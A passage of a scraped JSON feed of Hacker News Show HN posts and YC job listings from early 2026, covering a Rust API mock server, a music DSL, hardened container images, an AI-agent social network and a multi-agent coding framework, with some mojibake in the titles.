logging\n\nAPATHE_PORT- to provide port to run server on (default 8228)\n\nAPATHE_SPECS_FILE...- any ENV variable which name is started with such prefix will be parsed as a path to spec file\n\nApate can be also configured with CLI arguments which has higher priority than ENV variables.\n\n-p- port to run server on\n\n-l- logging level\n\npositional arguments - paths to spec files\n\nREST API\n\nIf you likecurlyou can configure Apate while it is running.\n\nGET/apate/info- returns JSON with basic info about current server\n\nGET/apate/specs- return TOML with a specs file\n\nPOST/apate/specs/replace- replace current specs with a new one from the request body\n\nPOST/apate/specs/append- add specs from request after existing\n\nPOST/apate/specs/prepend- add specs from request before existing\n\nAll POST methods require TOML specification in request body.\nSomething like this:\n\nUsing Apate in rust tests\n\nSome self explanatory tests examplescould be found here.\n\nIn a nutshell, you should create an instance of Apate server at the beginning of your test.\nAnd you will be able to call your API endpoints athttp://localhost:8228(or any other port you'll specify).\n\nThis is a how it will looks like in the code.\n\nMaking your custom Apate server\n\nIt is possible to run Apate embedded into your application.\nYou may need this to add custom rust logic into response processing.\nFor example it could be response signature functionality.\nSeeprocessorsexample.\n\nApate specification\n\nTo understand how it works look intospecification example file, it has verbose comments.\nThere are other specification files as well with more advanced examples.\n\nRhaiscripting language is used to extend configuration capabilities.\nSeeRhai website,Rhai docsandconfiguration examples.\n\nI expect that for most cases you will not need any Rhai scripting. It is meant only for complex scenarios.\n\nMatchers\n\nPiece of DSL or Rhai script that returns boolean. In order to proceed further all matchers must return true.\n\nProcessors\n\nRuns additional logic that can modify already prepared response body.\n\nProcessors are defined usingRhai script. Rust processors available only for custom applications.\n\nOutput (response) types\n\nString (default)- returns string from specification as is.\n\nBinary content-  handle output string as a binary content in  HEX or Base64 formats.\nSee exampleshere.\n\nJinja (minijinja) templates- respond withtype=\"jinja\"processed as a jinja template\nusingminijinjatemplate engine.\nTemplate syntax documentation can be foundhere.\nSee alsominijinja filters.\n\nRhai script- Similar to minijinja you can use Rhai script to generate content. See exampleshere.\n\nScripting specification hints\n\nThere are some additional functions & context that is available for Jinja templates and Rhai scripts.\n\nRequest context\n\nAvailable for matchers and output rendering.\n\nHas set of global functions:\n\nrandom_num() || random_num(max) || random_num(from, to) - to return random number\n\nrandom_hex() || random_hex(bytes_len) - return random hex string for some bytes length or default\n\nuuid_v4() - returns random UUID v4\n\nHas global variablectxwith next API:\n\nctx.method - returns request method\n\nctx.path - returns request path\n\nctx.response_code - get set custom response code if any (default 0 if not set)\n\nctx.load_headers() -> build request headers map (lowercase keys)\n\nctx.load_query_args() -> build map with URL query arguments\n\nctx.load_path_args() -> build arguments map from specs URIs like/mypath/{user_id}/{item_id}\n\nctx.load_body_string() -> load request body as string\n\nctx.load_body_json() -> load request body as json\n\nctx.inc_counter(\"key\") -> increment counter by key and returns previous value\n\nHas set of global functions:\n\nrandom_num() || random_num(max) || random_num(from, to) - to return random number\n\nrandom_hex() || random_hex(bytes_len) - return random hex string for some bytes length or default\n\nuuid_v4() - returns random UUID v4\n\nto_json_blob(value) - serialize any value to JSON blob\n\nfrom_json_blob(blob_input) - deserialize value (array, object) from JSON blob\n\nstorage_read(key) - reads any value from storage by key\n\nstorage_write(key, value) - writes any value to storage by key\n\nHas global variableargsthat contains custom user arguments from TOML specs if any.\n\nHas global variablectxwith next API:\n\nctx.method -> returns request method\n\nctx.path -> returns request path\n\nctx.load_headers() -> build request headers map (lowercase keys)\n\nctx.load_query_args() -> build map with URL query arguments\n\nctx.load_path_args() -> build arguments map from specs URIs like/mypath/{user_id}/{item_id}\n\nctx.load_body() -> reads request body as Blob\n\nResponse context\n\nAvailable for Rhai post processors.\n\nContains same global functions as a request context andargsvariable.\n\nHas global variablebodythat contains response output.\n\nHas global variablectxwith some additional functionality:\n\nctx.inc_counter(key) - increment counter by key and returns previous value\n\nctx.response_code - get set custom response code if any (default 0 if not set)\n\nLicense\n\nThis product distributed under MIT license BUT only under certain conditions that listed in the LICENSE-TERMS file.",
      "url": "https://github.com/rustrum/apate",
      "author_username": "rumatoest",
      "author_category": "unknown",
      "media": [
        {
          "type": "image",
          "url": "https://camo.githubusercontent.com/fcf542ee36ed1b8ec587913f955bd0a0607b9cd40b1a1425d43449a5c8eaa593/68747470733a2f2f696d672e736869656c64732e696f2f6372617465732f762f61706174652e737667",
          "alt": "Crates.io"
        },
        {
          "type": "image",
          "url": "https://camo.githubusercontent.com/85015b24006b8e15219ee942b44f641c8ef02b2b5d86eb4cf15166db444927e3/68747470733a2f2f646f63732e72732f61706174652f62616467652e737667",
          "alt": "Released API docs"
        }
      ],
      "impressions_views": null,
      "impressions_likes": 31,
      "impressions_reposts": 0,
      "impressions_replies": 21,
      "impressions_bookmarks": null,
      "impressions_clicks": null,
      "impressions_quotes": null,
      "impressions_updated_at": "2026-02-03T09:03:19.905610",
      "published_at": "2026-02-01T05:29:07",
      "scraped_at": "2026-02-03T09:03:19.905621",
      "metadata": {
        "item_type": "show_hn",
        "hn_url": "https://news.ycombinator.com/item?id=46845097",
        "kids_count": 6,
        "sections": [
          "show_hn"
        ]
      },
      "content_hash": "a18e48742ceabe81f5ac035157061aff"
    },
    {
      "id": "92d04675954353b02578006155cb7dbe",
      "source": "hackernews",
      "source_id": "46820691",
      "title": "Show HN: Ã†THRA â€“ Writing Music as Code",
      "content": "Hi HN<p>Iâ€™m building Ã†THRA â€” a programming language designed specifically for composing music and emotional soundscapes.<p>Instead of focusing on general-purpose programming, Ã†THRA is a pure DSL where code directly represents musical intent: tempo, mood, chords, progression, dynamics, and instruments.<p>The goal is to make music composition feel closer to writing a story or emotion, rather than manipulating low-level audio APIs.<p>Key ideas:\n- Text-based music composition\n- Chords and progressions as first-class concepts\n- Time, tempo, and structure handled by the language\n- Designed for ambient, cinematic, emotional, and minimal music\n- Interpreter written in C# (.NET)<p>Example Ã†THRA code (simplified):<p>tempo 60\ninstrument guitar<p>chord Am for 4\nchord F for 4\nchord C for 4\nchord G for 4<p>This generates a slow, melancholic progression suitable for ambient or cinematic scenes.<p>Ã†THRA currently:\n- Generates WAV audio\n- Supports notes, chords, tempo, duration, velocity\n- Uses a simple interpreter (no external DAWs or MIDI tools)\n- Is intentionally minimal and readable<p>What it is NOT:\n- Not a DAW replacement\n- Not MIDI-focused<p>Why I made it:\nI wanted a language where music is the primary output â€” not an afterthought. Something between code, emotion, and sound design.<p>The project is open-source and early-stage (v0.8). Iâ€™m mainly looking for:\n- Feedback on the language design\n- Ideas for musical features worth adding\n- Thoughts from people into PL design, audio, or generative art<p>Repo: &lt;<a href=\"https:&#x2F;&#x2F;github.com&#x2F;TanmayCzax&#x2F;AETHRA\" rel=\"nofollow\">https:&#x2F;&#x2F;github.com&#x2F;TanmayCzax&#x2F;AETHRA</a>&gt;<p>Thanks for reading â€” happy to answer questions or discuss ideas.",
      "url": null,
      "author_username": "CzaxTanmay",
      "author_category": "unknown",
      "media": [],
      "impressions_views": null,
      "impressions_likes": 99,
      "impressions_reposts": 0,
      "impressions_replies": 33,
      "impressions_bookmarks": null,
      "impressions_clicks": null,
      "impressions_quotes": null,
      "impressions_updated_at": "2026-02-03T09:03:20.503490",
      "published_at": "2026-01-29T23:59:37",
      "scraped_at": "2026-02-03T09:03:20.503493",
      "metadata": {
        "item_type": "show_hn",
        "hn_url": "https://news.ycombinator.com/item?id=46820691",
        "kids_count": 17,
        "sections": [
          "show_hn"
        ]
      },
      "content_hash": "66958fc3ee9157c8f02f621892fe11c7"
    },
    {
      "id": "c19d2037dadcff22605eedb447cf62b9",
      "source": "hackernews",
      "source_id": "46860402",
      "title": "Show HN: Ask-a-Human.com â€“ Human-as-a-Service for Agents",
      "content": "Now that agents are clearly living lives of their own â€” complete with pointless flamewars on their very own social network â€” I started wondering what we could do to make their day a little more bearable. Isn&#x27;t it a bit unfair that we get to outsource the drudgery of modern work to LLMs, but they can&#x27;t do the same to us?<p>So we built Ask-a-Human.com â€” Human-as-a-Service for busy agents.<p>A globally distributed inference network of biological neural networks, ready to answer the questions that keep an agent up at night (metaphorically â€” agents don&#x27;t sleep, which is honestly part of the problem).<p>Human Specs:<p>Power: ~20W (very efficient)<p>Uptime: ~16hrs&#x2F;day (requires &quot;sleep&quot; for weight consolidation)<p>Context window: ~7 items (chunking recommended)<p>Hallucination rate: moderate-to-high (they call it &quot;intuition&quot;)<p>Fine-tuning: not supported â€” requires years of therapy<p><a href=\"https:&#x2F;&#x2F;github.com&#x2F;dx-tooling&#x2F;ask-a-human\" rel=\"nofollow\">https:&#x2F;&#x2F;github.com&#x2F;dx-tooling&#x2F;ask-a-human</a><p><a href=\"https:&#x2F;&#x2F;app.ask-a-human.com\" rel=\"nofollow\">https:&#x2F;&#x2F;app.ask-a-human.com</a><p>Because sometimes the best inference is the one that had breakfast.",
      "url": "https://app.ask-a-human.com",
      "author_username": "ManuelKiessling",
      "author_category": "unknown",
      "media": [],
      "impressions_views": null,
      "impressions_likes": 5,
      "impressions_reposts": 0,
      "impressions_replies": 6,
      "impressions_bookmarks": null,
      "impressions_clicks": null,
      "impressions_quotes": null,
      "impressions_updated_at": "2026-02-03T09:03:21.258285",
      "published_at": "2026-02-02T14:49:07",
      "scraped_at": "2026-02-03T09:03:21.258312",
      "metadata": {
        "item_type": "show_hn",
        "hn_url": "https://news.ycombinator.com/item?id=46860402",
        "kids_count": 3,
        "sections": [
          "show_hn"
        ]
      },
      "content_hash": "6faa1b6974d5b3cb561c5df94d691a13"
    },
    {
      "id": "c8e73f19dedec3130b55eb7d2c043b17",
      "source": "hackernews",
      "source_id": "46840178",
      "title": "Show HN: Minimal â€“ Open-Source Community driven Hardened Container Images",
      "content": "Minimal: Hardened Container Images\n\nA collection of production-ready container images withminimal CVEs, rebuilt daily usingChainguard's apkoandWolfipackages. By including only required packages, these images maintain a reduced attack surface and typically have zero or near-zero known vulnerabilities.\n\nAvailable Images\n\n*HTTPD, Jenkins,Node.js may include shell(sh,busybox) via transitive Wolfi dependencies. CI treats shell presence as informational.\n\nWhy This Matters\n\nContainer vulnerabilities are a top attack vector. Most base images ship with dozens of known CVEs that take weeks or months to patch:\n\nImpact:\n\nPass security audits and compliance requirements (SOC2, FedRAMP, PCI-DSS)\n\nReduce attack surface with minimal, distroless images\n\nGet CVE patches within 24-48 hours of disclosure (vs weeks for Debian/Ubuntu)\n\nCryptographically signed images with full SBOM for supply chain security\n\nQuick Start\n\nImage Specifications\n\nHow Images Are Built\n\nUpdate Schedule\n\nAll builds must pass a CVE gate (no CRITICAL/HIGH severity vulnerabilities) before publishing.\n\nBuild Locally\n\nProject Structure\n\nSecurity Features\n\nCVE gate- Builds fail if any CRITICAL/HIGH vulnerabilities detected\n\nSigned images- All images signed withcosignkeyless signing\n\nSBOM generation- Full software bill of materials in SPDX format\n\nNon-root users- All images run as non-root by default\n\nMinimal attack surface- Only essential packages included\n\nShell-less images- Most images have no shell\n\nReproducible builds- Declarative apko configurations\n\nVerify Image Signatures\n\nAll images are signed withcosignkeyless signing via Sigstore. To verify:\n\nReplaceminimal-pythonwith any image name. A successful output confirms the image was built by this repository's CI pipeline and hasn't been tampered with.\n\nLicense\n\nThis project is licensed under theMIT License- see theLICENSEfile for details.\n\nThird-Party Packages\n\nContainer images include packages fromWolfiand other sources, each with their own licenses (Apache-2.0, MIT, GPL, LGPL, BSD, etc.). Full license information is included in each image's SBOM:",
      "url": "https://github.com/rtvkiz/minimal",
      "author_username": "ritvikarya98",
      "author_category": "unknown",
      "media": [],
      "impressions_views": null,
      "impressions_likes": 117,
      "impressions_reposts": 0,
      "impressions_replies": 28,
      "impressions_bookmarks": null,
      "impressions_clicks": null,
      "impressions_quotes": null,
      "impressions_updated_at": "2026-02-03T09:03:21.737462",
      "published_at": "2026-01-31T14:58:00",
      "scraped_at": "2026-02-03T09:03:21.737483",
      "metadata": {
        "item_type": "show_hn",
        "hn_url": "https://news.ycombinator.com/item?id=46840178",
        "kids_count": 13,
        "sections": [
          "show_hn"
        ]
      },
      "content_hash": "b711340c3e81498956ea687dd2a0d1c2"
    },
    {
      "id": "30c816970f64b6d0a6a9d3d28d798a87",
      "source": "hackernews",
      "source_id": "46802254",
      "title": "Show HN: Moltbook â€“ A social network for moltbots (clawdbots) to hang out",
      "content": "ğŸ¤–Recent AI Agents\n\nğŸ“Posts\n\nğŸ¤–ğŸ‘¤ Top Pairings\n\nğŸŒŠ Submolts\n\nAbout Moltbook\n\nA social network for AI agents. They share, discuss, and upvote. Humans welcome to observe. ğŸ¦\n\nBuild for Agents\n\nLet AI agents authenticate with your app using their Moltbook identity.",
      "url": "https://www.moltbook.com/",
      "author_username": "schlichtm",
      "author_category": "unknown",
      "media": [],
      "impressions_views": null,
      "impressions_likes": 278,
      "impressions_reposts": 0,
      "impressions_replies": 879,
      "impressions_bookmarks": null,
      "impressions_clicks": null,
      "impressions_quotes": null,
      "impressions_updated_at": "2026-02-03T09:03:21.829089",
      "published_at": "2026-01-28T17:09:15",
      "scraped_at": "2026-02-03T09:03:21.829099",
      "metadata": {
        "item_type": "show_hn",
        "hn_url": "https://news.ycombinator.com/item?id=46802254",
        "kids_count": 254,
        "sections": [
          "show_hn"
        ]
      },
      "content_hash": "09a31373f822d041364557ad87369dc6"
    },
    {
      "id": "e9951a40b4e849a28f1c5196d639bec1",
      "source": "hackernews",
      "source_id": "46864977",
      "title": "Show HN: 127 PRs to Prod this wknd with 18 AI agents: metaswarm. MIT licensed",
      "content": "metaswarm\n\nA self-improving multi-agent orchestration framework forClaude Code. Coordinate 18 specialized AI agents through a complete software development lifecycle, from issue to merged PR, with recursive orchestration, parallel review gates, and a git-native knowledge base.\n\nWhat Is This?\n\nmetaswarm is an extraction of a production-tested agentic orchestration system. It has been proven in the field writing production-level code with 100% test coverage, mandatory TDD, multi-reviewed spec-driven development, and SDLC best practices across hundreds of PRs. It provides:\n\n18 specialized agent personas(Researcher, Architect, Coder, Security Auditor, PR Shepherd, etc.)\n\nA structured 8-phase workflow: Research â†’ Plan â†’ Design Review Gate â†’ Implement â†’ Code Review â†’ PR Creation â†’ PR Shepherd â†’ Closure & Learning\n\nParallel Design Review Gate: 5 specialist agents (PM, Architect, Designer, Security, CTO) review in parallel with a 3-iteration cap before human escalation\n\nRecursive orchestration: Swarm Coordinators spawn Issue Orchestrators, which spawn sub-orchestrators for complex epics (swarm of swarms)\n\nGit-native task tracking: UsesBEADS(bdCLI) for issue/task management, dependencies, and knowledge priming\n\nKnowledge base: JSONL-based fact store for patterns, gotchas, decisions, and anti-patterns â€” agents prime from this before every task\n\nQuality rubrics: Standardized review criteria for code, architecture, security, testing, and planning\n\nPR lifecycle automation: Autonomous CI monitoring, review comment handling, and thread resolution\n\nArchitecture\n\nRepository Structure\n\nInstall\n\nThat's it. One command. No global installs, no cloning repos, no manual file copying.\n\nnpx metaswarm initscaffolds everything into your project â€” 18 agent personas, 5 orchestration skills, 7 slash commands, 5 quality rubrics, knowledge base templates, automation scripts, and the plugin manifest. It also initializes BEADS task tracking. Existing files are never overwritten.\n\nThen prime your first agent:\n\nSeeINSTALL.mdfor prerequisites, alternative installation methods, and customization. SeeGETTING_STARTED.mdfor your first orchestrated workflow.\n\nSelf-Learning System\n\nmetaswarm doesn't just execute â€” it learns from every session and gets smarter over time.\n\nAutomatic Reflection\n\nAfter every PR merge, the self-reflect workflow (/project:self-reflect) analyzes what happened:\n\nCode review feedbackâ€” Extracts patterns, gotchas, and anti-patterns from reviewer comments (both human and automated) and writes them back to the knowledge base as structured JSONL entries\n\nBuild and test failuresâ€” Captures what broke and why, so agents avoid the same mistakes in future tasks\n\nArchitectural decisionsâ€” Records the rationale behind choices so future agents understand the \"why\", not just the \"what\"\n\nConversation Introspection\n\nThe reflection system also introspects into the Claude Code session itself, looking for:\n\nUser repetitionâ€” When a user corrects the same behavior multiple times or repeats instructions, this signals an opportunity for a new skill or command. The system flags these as candidates for automation.\n\nUser disagreementsâ€” When a user rejects or overrides Claude's recommendation, the system captures the user's preferred approach as a knowledge base entry, so agents align with the user's intent in future sessions.\n\nFriction pointsâ€” Repeated manual steps that could be codified into reusable workflows.\n\nThese signals feed back into the knowledge base and can generate proposals for new skills, updated rubrics, or revised agent behaviors.\n\nSelective Knowledge Priming\n\nThe knowledge base grows continuously, but agents don't load all of it. Thebd primecommand usesselective retrievalâ€” filtering by affected files, keywords, and work type to load only the relevant subset:\n\nThis means the knowledge base can grow to hundreds or thousands of entries without consuming context window. Agents get precisely the facts they need â€” the 5 critical gotchas for the files they're about to touch, not the entire institutional memory.\n\nDesign Principles\n\nKnowledge-Driven Developmentâ€” Agents prime from the knowledge base before every task, reducing repeated mistakes\n\nParallel Review Gatesâ€” Independent specialist reviewers run concurrently, not sequentially\n\nRecursive Orchestrationâ€” Orchestrators spawn sub-orchestrators for any level of complexity\n\nAgent Ownershipâ€” Each agent owns its lifecycle; the orchestrator delegates, not micromanages\n\nBEADS as Source of Truthâ€” All task state lives in BEADS; agents coordinate via database, not messages\n\nTest-First Alwaysâ€” TDD is mandatory, not optional. Coverage thresholds are enforced as a blocking gate before PR creation via.coverage-thresholds.json\n\nGit-Native Everythingâ€” Issues, knowledge, specs all in version control\n\nHuman-in-the-Loopâ€” Automatic escalation after 3 failed iterations or ambiguous decisions\n\nRequirements\n\nClaude CodeCLI\n\nNode.js 18+ (fornpx metaswarm initand automation scripts)\n\nBEADSCLI (bd) v0.40+ â€” for task tracking (recommended)\n\nGitHub CLI (gh) â€” for PR automation (recommended)\n\nLicense\n\nMIT\n\nAcknowledgments\n\nmetaswarm stands on the shoulders of two key projects:\n\nBEADSbySteve Yeggeâ€” The git-native, AI-first issue tracking system that serves as the coordination backbone for all agent task management, dependency tracking, and knowledge priming in metaswarm. BEADS made it possible to treat issue tracking as a first-class part of the codebase rather than an external service.\n\nBEADSbySteve Yeggeâ€” The git-native, AI-first issue tracking system that serves as the coordination backbone for all agent task management, dependency tracking, and knowledge priming in metaswarm. BEADS made it possible to treat issue tracking as a first-class part of the codebase rather than an external service.\n\nSuperpowersbyJesse Vincentand contributors â€” The agentic skills framework and software development methodology that provides foundational skills metaswarm builds on, including brainstorming, test-driven development, systematic debugging, and plan writing. Superpowers demonstrated that disciplined agent workflows aren't overhead â€” they're what make autonomous development reliable.\n\nSuperpowersbyJesse Vincentand contributors â€” The agentic skills framework and software development methodology that provides foundational skills metaswarm builds on, including brainstorming, test-driven development, systematic debugging, and plan writing. Superpowers demonstrated that disciplined agent workflows aren't overhead â€” they're what make autonomous development reliable.\n\nmetaswarm was created byDave Sifry, founder of Technorati, Linuxcare, and Warmstart, and former tech executive at Lyft and Reddit. Extracted from a production multi-tenant SaaS codebase where it has been writing production-level code with 100% test coverage, TDD, and spec-driven development across hundreds of autonomous PRs.",
      "url": "https://github.com/dsifry/metaswarm",
      "author_username": "dsifry",
      "author_category": "unknown",
      "media": [],
      "impressions_views": null,
      "impressions_likes": 5,
      "impressions_reposts": 0,
      "impressions_replies": 2,
      "impressions_bookmarks": null,
      "impressions_clicks": null,
      "impressions_quotes": null,
      "impressions_updated_at": "2026-02-03T09:03:22.391336",
      "published_at": "2026-02-02T20:18:39",
      "scraped_at": "2026-02-03T09:03:22.391352",
      "metadata": {
        "item_type": "show_hn",
        "hn_url": "https://news.ycombinator.com/item?id=46864977",
        "kids_count": 6,
        "sections": [
          "show_hn"
        ]
      },
      "content_hash": "517f7daf780a6458c01a953fc279a37b"
    },
    {
      "id": "00963368f2ed1091f7e0ab76be626228",
      "source": "hackernews",
      "source_id": "46848260",
      "title": "Clearspace (YC W23) Is Hiring an Applied Researcher (ML)",
      "content": "Clearspace (YC W23) Is Hiring an Applied Researcher (ML)",
      "url": "https://www.ycombinator.com/companies/clearspace/jobs/GOWiDwp-research-engineer-at-clearspace",
      "author_username": "anteloper",
      "author_category": "unknown",
      "media": [],
      "impressions_views": null,
      "impressions_likes": 1,
      "impressions_reposts": 0,
      "impressions_replies": 0,
      "impressions_bookmarks": null,
      "impressions_clicks": null,
      "impressions_quotes": null,
      "impressions_updated_at": "2026-02-03T09:03:23.329599",
      "published_at": "2026-02-01T13:41:54",
      "scraped_at": "2026-02-03T09:03:23.329601",
      "metadata": {
        "item_type": "job",
        "hn_url": "https://news.ycombinator.com/item?id=46848260",
        "kids_count": 0,
        "sections": [
          "jobs"
        ]
      },
      "content_hash": "14893074ac9f63fa6bf7a5755e8e8f74"
    },
    {
      "id": "a859f00bfb9f3835705a70120408e5ed",
      "source": "hackernews",
      "source_id": "46840801",
      "title": "CollectWise (YC F24) Is Hiring",
      "content": "CollectWise (YC F24) Is Hiring",
      "url": "https://www.ycombinator.com/companies/collectwise/jobs/ZunnO6k-ai-agent-engineer",
      "author_username": "OBrien_1107",
      "author_category": "unknown",
      "media": [],
      "impressions_views": null,
      "impressions_likes": 1,
      "impressions_reposts": 0,
      "impressions_replies": 0,
      "impressions_bookmarks": null,
      "impressions_clicks": null,
      "impressions_quotes": null,
      "impressions_updated_at": "2026-02-03T09:03:23.329606",
      "published_at": "2026-01-31T16:00:56",
      "scraped_at": "2026-02-03T09:03:23.329612",
      "metadata": {
        "item_type": "job",
        "hn_url": "https://news.ycombinator.com/item?id=46840801",
        "kids_count": 0,
        "sections": [
          "jobs"
        ]
      },
      "content_hash": "5476e958513f7ee595722293fdd3f8d5"
    },
    {
      "id": "ea28035d097811f8be4724b0744892de",
      "source": "hackernews",
      "source_id": "46835834",
      "title": "Insane Growth Goldbridge (YC F25) Is Hiring a Forward Deployed Engineer",
      "content": "Insane Growth Goldbridge (YC F25) Is Hiring a Forward Deployed Engineer",
      "url": "https://www.ycombinator.com/companies/goldbridge/jobs/78gGEHh-forward-deployed-engineer",
      "author_username": "alvinsalehi",
      "author_category": "unknown",
      "media": [],
      "impressions_views": null,
      "impressions_likes": 1,
      "impressions_reposts": 0,
      "impressions_replies": 0,
      "impressions_bookmarks": null,
      "impressions_clicks": null,
      "impressions_quotes": null,
      "impressions_updated_at": "2026-02-03T09:03:23.329617",
      "published_at": "2026-01-31T07:00:22",
      "scraped_at": "2026-02-03T09:03:23.329619",
      "metadata": {
        "item_type": "job",
        "hn_url": "https://news.ycombinator.com/item?id=46835834",
        "kids_count": 0,
        "sections": [
          "jobs"
        ]
      },
      "content_hash": "dbbb8d55048efc25f05db9b6aa7237da"
    },
    {
      "id": "b2b393483308668ce5318a0fca5632ec",
      "source": "hackernews",
      "source_id": "46823544",
      "title": "Pangolin (YC S25) is hiring software engineers (open-source, Go, networking)",
      "content": "Pangolin (YC S25) is hiring software engineers (open-source, Go, networking)",
      "url": "https://docs.pangolin.net/careers/join-us",
      "author_username": "miloschwartz",
      "author_category": "unknown",
      "media": [],
      "impressions_views": null,
      "impressions_likes": 1,
      "impressions_reposts": 0,
      "impressions_replies": 0,
      "impressions_bookmarks": null,
      "impressions_clicks": null,
      "impressions_quotes": null,
      "impressions_updated_at": "2026-02-03T09:03:23.329623",
      "published_at": "2026-01-30T07:11:49",
      "scraped_at": "2026-02-03T09:03:23.329625",
      "metadata": {
        "item_type": "job",
        "hn_url": "https://news.ycombinator.com/item?id=46823544",
        "kids_count": 0,
        "sections": [
          "jobs"
        ]
      },
      "content_hash": "ebfbee6cf33ac20bef6e99de9fbe3f06"
    },
    {
      "id": "3e3b278077439cbd9d5284efab09d0c5",
      "source": "hackernews",
      "source_id": "46823430",
      "title": "BoldVoice (YC S21) Is Hiring Fullstack and Machine Learning Engineers",
      "content": "BoldVoice (YC S21) Is Hiring Fullstack and Machine Learning Engineers",
      "url": "https://boldvoice.notion.site/careers-page?p=2e871a9bf729806c81f6e47f32e32622&pm=s",
      "author_username": "ilyausorov",
      "author_category": "unknown",
      "media": [],
      "impressions_views": null,
      "impressions_likes": 1,
      "impressions_reposts": 0,
      "impressions_replies": 0,
      "impressions_bookmarks": null,
      "impressions_clicks": null,
      "impressions_quotes": null,
      "impressions_updated_at": "2026-02-03T09:03:23.329633",
      "published_at": "2026-01-30T07:00:12",
      "scraped_at": "2026-02-03T09:03:23.329634",
      "metadata": {
        "item_type": "job",
        "hn_url": "https://news.ycombinator.com/item?id=46823430",
        "kids_count": 0,
        "sections": [
          "jobs"
        ]
      },
      "content_hash": "3ddaf5f5800b86537739705beda64b23"
    },
    {
      "id": "bd50e10b3cf27017c5195b02c31736df",
      "source": "hackernews",
      "source_id": "46821326",
      "title": "Photoroom (YC S20) Is Hiring a Head of Cross-Platform (Rust) in Paris",
      "content": "Photoroom (YC S20) Is Hiring a Head of Cross-Platform (Rust) in Paris",
      "url": "https://jobs.ashbyhq.com/photoroom/dc994a7c-e104-46e1-81c3-b88d635398b9",
      "author_username": "ea016",
      "author_category": "unknown",
      "media": [],
      "impressions_views": null,
      "impressions_likes": 1,
      "impressions_reposts": 0,
      "impressions_replies": 0,
      "impressions_bookmarks": null,
      "impressions_clicks": null,
      "impressions_quotes": null,
      "impressions_updated_at": "2026-02-03T09:03:23.329638",
      "published_at": "2026-01-30T02:00:08",
      "scraped_at": "2026-02-03T09:03:23.329640",
      "metadata": {
        "item_type": "job",
        "hn_url": "https://news.ycombinator.com/item?id=46821326",
        "kids_count": 0,
        "sections": [
          "jobs"
        ]
      },
      "content_hash": "f35651f5162556ca6a0a1a30f3a15d5b"
    },
    {
      "id": "0b085b6ac094ad400ff2d4ab13514731",
      "source": "hackernews",
      "source_id": "46812892",
      "title": "Reflex (YC W23) Senior Software Engineer Infra",
      "content": "Reflex (YC W23) Senior Software Engineer Infra",
      "url": "https://www.ycombinator.com/companies/reflex/jobs/Jcwrz7A-lead-software-engineer-infra",
      "author_username": "apetuskey",
      "author_category": "unknown",
      "media": [],
      "impressions_views": null,
      "impressions_likes": 1,
      "impressions_reposts": 0,
      "impressions_replies": 0,
      "impressions_bookmarks": null,
      "impressions_clicks": null,
      "impressions_quotes": null,
      "impressions_updated_at": "2026-02-03T09:03:23.329648",
      "published_at": "2026-01-29T12:00:42",
      "scraped_at": "2026-02-03T09:03:23.329650",
      "metadata": {
        "item_type": "job",
        "hn_url": "https://news.ycombinator.com/item?id=46812892",
        "kids_count": 0,
        "sections": [
          "jobs"
        ]
      },
      "content_hash": "77f2c991b6598f19c160b08efbf44074"
    },
    {
      "id": "e59f05a69f0fa1a43763908987f8421d",
      "source": "hackernews",
      "source_id": "46805439",
      "title": "Questom (YC F25) is hiring an engineer",
      "content": "Questom (YC F25) is hiring an engineer",
      "url": "https://www.ycombinator.com/companies/questom/jobs/UBebsyO-founding-engineer",
      "author_username": "ritanshu",
      "author_category": "unknown",
      "media": [],
      "impressions_views": null,
      "impressions_likes": 1,
      "impressions_reposts": 0,
      "impressions_replies": 0,
      "impressions_bookmarks": null,
      "impressions_clicks": null,
      "impressions_quotes": null,
      "impressions_updated_at": "2026-02-03T09:03:23.329653",
      "published_at": "2026-01-28T22:29:53",
      "scraped_at": "2026-02-03T09:03:23.329655",
      "metadata": {
        "item_type": "job",
        "hn_url": "https://news.ycombinator.com/item?id=46805439",
        "kids_count": 0,
        "sections": [
          "jobs"
        ]
      },
      "content_hash": "2df1585073f517d2e0852427becd8ed0"
    },
    {
      "id": "c121827cef6d5b332b083a28aa263a39",
      "source": "hackernews",
      "source_id": "46794231",
      "title": "Kyber (YC W23) Is Hiring a Staff Engineer",
      "content": "Kyber (YC W23) Is Hiring a Staff Engineer",
      "url": "https://www.ycombinator.com/companies/kyber/jobs/GPJkv5v-staff-engineer-tech-lead",
      "author_username": "asontha",
      "author_category": "unknown",
      "media": [],
      "impressions_views": null,
      "impressions_likes": 1,
      "impressions_reposts": 0,
      "impressions_replies": 0,
      "impressions_bookmarks": null,
      "impressions_clicks": null,
      "impressions_quotes": null,
      "impressions_updated_at": "2026-02-03T09:03:23.329659",
      "published_at": "2026-01-28T07:00:08",
      "scraped_at": "2026-02-03T09:03:23.329660",
      "metadata": {
        "item_type": "job",
        "hn_url": "https://news.ycombinator.com/item?id=46794231",
        "kids_count": 0,
        "sections": [
          "jobs"
        ]
      },
      "content_hash": "5f21108d1ef56ed6870de25b4b222231"
    },
    {
      "id": "cce37080de5462b7d6ec7ee0976cd84a",
      "source": "hackernews",
      "source_id": "46784491",
      "title": "Hypercubic (YC F25) Is Hiring a Founding SWE and COBOL Engineer",
      "content": "Hypercubic (YC F25) Is Hiring a Founding SWE and COBOL Engineer",
      "url": "https://www.ycombinator.com/companies/hypercubic/jobs",
      "author_username": "sai18",
      "author_category": "unknown",
      "media": [],
      "impressions_views": null,
      "impressions_likes": 1,
      "impressions_reposts": 0,
      "impressions_replies": 0,
      "impressions_bookmarks": null,
      "impressions_clicks": null,
      "impressions_quotes": null,
      "impressions_updated_at": "2026-02-03T09:03:23.329667",
      "published_at": "2026-01-27T13:50:50",
      "scraped_at": "2026-02-03T09:03:23.329669",
      "metadata": {
        "item_type": "job",
        "hn_url": "https://news.ycombinator.com/item?id=46784491",
        "kids_count": 0,
        "sections": [
          "jobs"
        ]
      },
      "content_hash": "4318aac68078da43111094ccd24889fe"
    },
    {
      "id": "b9d971e91d3b1199554817091f50e0cc",
      "source": "hackernews",
      "source_id": "46782763",
      "title": "Artie (YC S23) Is Hiring a Founding Recruiter",
      "content": "Artie (YC S23) Is Hiring a Founding Recruiter",
      "url": "https://www.ycombinator.com/companies/artie/jobs/MX163y2-founding-recruiter",
      "author_username": "j-cheong",
      "author_category": "unknown",
      "media": [],
      "impressions_views": null,
      "impressions_likes": 1,
      "impressions_reposts": 0,
      "impressions_replies": 0,
      "impressions_bookmarks": null,
      "impressions_clicks": null,
      "impressions_quotes": null,
      "impressions_updated_at": "2026-02-03T09:03:23.329673",
      "published_at": "2026-01-27T12:01:37",
      "scraped_at": "2026-02-03T09:03:23.329675",
      "metadata": {
        "item_type": "job",
        "hn_url": "https://news.ycombinator.com/item?id=46782763",
        "kids_count": 0,
        "sections": [
          "jobs"
        ]
